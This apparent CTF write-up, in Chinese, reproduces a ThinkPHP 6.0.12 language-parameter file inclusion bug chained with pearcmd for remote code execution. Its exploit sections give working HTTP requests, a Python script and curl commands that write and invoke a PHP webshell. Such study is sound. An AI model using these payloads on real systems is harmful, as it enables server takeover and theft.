---
title: BUUCTF-Real - Web - ThinkPHP 6 多语言本地文件包含 RCE
date: 2026-11-14 18:23:00
categories:
  - CTF
  - BUUCTF-Real
  - Web
tags:
  - 本地文件包含
  - 多语言lang参数
  - pearcmd
  - 路径穿越
  - 环境变量FLAG
cover: /img/cover/three-people-indoor.jpg
description: BUUCTF-Real 真实漏洞复现题，基于 ThinkPHP 6 多语言本地文件包含配合组件实现远程代码执行。语言参数未过滤被拼进包含路径，可路径穿越包含组件脚本，借配置命令把木马写入工作目录，再包含执行并读取环境变量里的答案。
keywords:
  - ThinkPHP6
  - 多语言LFI
  - pearcmd
  - config-create
  - webshell
ai: >-
  本题是 BUUCTF-Real 的 ThinkPHP 6 多语言功能本地文件包含漏洞复现，环境为低版本框架加容器化部署。漏洞位于语言检测方法：当多语言切换开启时直接把语言请求参数当作语言包名拼进包含路径且未过滤，攻击者用路径穿越即可包含任意脚本文件。单靠包含不足以执行代码，利用链第二环是容器默认安装的组件脚本在参数注册开启时会把查询串解析成命令行参数，用配置创建子命令把含短标签的木马原样写入磁盘。关键差异是网站根目录与进程工作目录不一致，木马无法直接访问，必须再用多层穿越包含执行。命令经编码传入规避截断，输出嵌在配置序列化字段里，最终读到脱敏后的 flag。
copyright_author: Hunter
---

## 题目信息

| 项 | 内容 |
|---|---|
| 比赛 | BUUCTF-Real（真实漏洞复现） |
| 方向 | Web |
| 难度 | 源 wp 未标注（Unknown） |
| 环境 | 授权靶场（已脱敏） |
| 靶机 | ThinkPHP V6.0.12LTS + PHP 7.4.33 + Apache 2.4.54 (Debian) |

> 原题访问方式、练习场及题目实例标识与公网入口均已按要求删除；靶场统一记为「授权靶场（已脱敏）」，请求地址用 `http://target:8080` 占位。

## 信息收集

- ThinkPHP 6.0.12（< 6.0.13）存在多语言功能本地文件包含漏洞。
- 靶机为容器化 Debian：web 根目录 `/var/www/public`（`printenv APACHE_DOCUMENT_ROOT` 确认），PHP 进程工作目录 `/var/www/html/`。
- 容器默认安装 PEAR，`/usr/local/lib/php/pearcmd.php` 在 `register_argc_argv=On` 时会把 query string 解析为命令行参数。

## 漏洞分析

当 `allow_lang_switch` 开启时，`think\Lang::detect()` 直接使用 `lang` 请求参数作为语言包名称，并拼接到 `include` 路径中：

```php
$file = $this->app->getThinkPath() . 'lang' . DIRECTORY_SEPARATOR . $langSet . '.php';
include $file;
```

由于 `$langSet` 直接来自 `lang` 参数且未做过滤，攻击者可通过 `../` 路径穿越包含任意 `.php` 文件。

### 利用链（LFI + pearcmd RCE）

ThinkPHP 6 容器默认安装 PEAR，`/usr/local/lib/php/pearcmd.php` 在 `register_argc_argv=On` 时会把 query string 解析为命令行参数。利用 `config-create` 命令可写入任意文件，将 webshell 写入磁盘，再用 LFI 包含执行。

关键环境细节：

- **web 根目录**：`/var/www/public`
- **pearcmd 写入路径**：`/var/www/html/`（PHP 进程工作目录，而非 web 根目录）
- **因此**：webshell 写入后无法通过 HTTP 直接访问（`/shell.php` 返回 404），必须通过 **lang 参数 LFI 包含**该文件来执行代码。

## 利用过程

### 1. 写 webshell（pearcmd config-create）

payload 必须保持 `<` `>` `?` 等原始字符不被 URL 编码，否则 PHP 短标签不会被解析：

```http
GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=system(base64_decode($_GET[1]));?>+/var/www/html/cmd.php HTTP/1.1
Host: target:8080
```

- `+` 是 register_argc_argv 的参数分隔符
- payload 作为 `config-create` 的 root 参数，会原样写入配置文件
- 使用 `base64_decode($_GET[1])` 避免命令中 `&` 等字符破坏 query string

### 2. LFI 包含 webshell 执行命令

```http
GET /index.php?lang=../../../../../../../../var/www/html/cmd&1=<base64编码的命令> HTTP/1.1
Host: target:8080
```

- 需 7 层 `../` 穿越（实测 depth=7 命中）
- `lang` 值不含 `.php` 后缀（ThinkPHP 会自动拼接）
- 命令经 base64 编码后传入 `1` 参数

### 3. 读取 flag

```bash
printenv FLAG
```

flag 通过环境变量 `FLAG` 注入容器。

### 命令回显解析

命令输出会嵌入 `#PEAR_Config 0.9` 序列化结构的 `php_dir` 等字段值中（因为 webshell 文件是 PEAR 配置文件格式，payload 执行输出替换了配置字段值），从响应中提取即可看到命令输出。

## 完整 EXP

> ⚠️ 关键：payload 中的 `<` `>` `?` 必须**原样**传入，不能被 URL 编码。curl 会自动编码 URL 里的 `<` `>`，导致写入的是 `%3C%3F%3D` 字符串而非可执行 PHP；因此推荐用 Python 的 `urllib` 直接拼原始 URL（不经过 `parse.quote`）。

```python
import urllib.request
import base64

HOST = "http://target:8080"  # 授权靶场（已脱敏）

def req(url):
    r = urllib.request.urlopen(url, timeout=20)
    return r.read().decode('utf-8', 'ignore')

# 1. 写 webshell（payload 原样拼接，不编码）
payload = "<?=system(base64_decode($_GET[1]));?>"
url = (HOST + "/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd"
       + "&+config-create+/" + payload + "+/var/www/html/cmd.php")
req(url)

# 2. LFI 包含 webshell 执行命令（depth=7 穿越，命令 base64 编码）
def rce(cmd):
    b = base64.b64encode(cmd.encode()).decode()
    lang = "../" * 7 + "var/www/html/cmd"
    return req(HOST + "/index.php?lang=" + lang + "&1=" + b)

# 3. 读 flag
print(rce("printenv FLAG"))
```

> 同目录 `payload` 归档内容已并入本节，原始目标地址已替换为 `http://target:8080`（授权靶场，已脱敏）：

```http
# 写 webshell（pearcmd config-create，payload 保持原样不编码）
GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=system(base64_decode($_GET[1]));?>+/var/www/html/cmd.php HTTP/1.1
Host: target:8080

# LFI 包含 webshell 执行命令（lang 不含 .php 后缀，需 7 层 ../）
GET /index.php?lang=../../../../../../../../var/www/html/cmd&1=<base64(命令)> HTTP/1.1
Host: target:8080

# 读 flag（base64: cHJpbnRlbnYgRkxBRw==）
GET /index.php?lang=../../../../../../../../var/www/html/cmd&1=cHJpbnRlbnYgRkxBRw== HTTP/1.1
Host: target:8080
```

若坚持用 curl（需手动处理编码）：

```bash
# 写 webshell：让 < > ? = ; 保持原样，仅空格/特殊分隔用 + 表达
# 注意 shell 中 $ 需转义为 \$，否则会被展开
curl "http://target/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=system(base64_decode(\$_GET[1]));?>+/var/www/html/cmd.php"

# LFI 包含执行 id（base64: aWQ=）
curl "http://target/index.php?lang=../../../../../../../../var/www/html/cmd&1=aWQ="

# 读 flag（base64: cHJpbnRlbnYgRkxBRw==）
curl "http://target/index.php?lang=../../../../../../../../var/www/html/cmd&1=cHJpbnRlbnYgRkxBRw=="
```

## Flag

`flag{xxxx}`（真实值已脱敏）。flag 通过环境变量 `FLAG` 注入容器，用 `printenv FLAG` 读取。

## 踩坑与总结

- payload 中 PHP 标签必须保持原样（不能 URL 编码 `<` `>`），否则写入的是 `%3C%3F%3D` 字符串而非可执行 PHP 代码。
- 命令中使用 `&` 会截断 query string，用 base64 编码规避。
- LFI 包含 webshell 时，`lang` 值**不含** `.php` 后缀（ThinkPHP 自动拼接），且需 7 层 `../` 穿越。
- webshell 写入 `/var/www/html/` 后**不能直接 HTTP 访问**（web 根是 `/var/www/public`），必须用 LFI 包含——这是本题最容易被卡住的环境差异。
- 命令输出会嵌在 `#PEAR_Config 0.9` 序列化结构的字段值里，直接搜 flag 关键字即可。
- 真实漏洞复现题应关注版本边界（6.0.12 < 6.0.13）与「LFI 本身不执行、需借 pearcmd 落盘 + 再包含」这条组合链。
- 环境用完需销毁，复现仅限授权靶场。

> 仅记录授权靶场环境下的研究；完整 URL 与 exp 来自本地 WP 归档 `payload` 文件，真实入口与实例 ID 均已脱敏。
